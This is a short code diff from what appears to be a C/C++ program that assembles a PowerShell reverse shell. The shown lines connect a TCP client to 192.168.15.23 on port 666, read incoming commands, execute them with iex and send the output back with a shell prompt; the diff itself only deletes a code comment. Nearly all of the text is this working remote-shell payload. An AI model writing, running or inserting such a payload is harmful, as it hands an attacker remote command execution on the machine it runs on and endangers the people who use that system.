@@ -13,7 +13,7 @@ int main()
     powershell = "$client = New-Object System.Net.Sockets.TCPClient('192.168.15.23',666)";
     powershell += "$stream = $client.GetStream()";
     powershell += "[byte[]]$bytes = 0..65535|%{0}";
-    powershell += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){"; // 'Argument' not a typo
+    powershell += "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){";
     powershell += "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i)";
     powershell += "$sendback = (iex $data 2>&1 | Out-String )";
     powershell += "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> '";
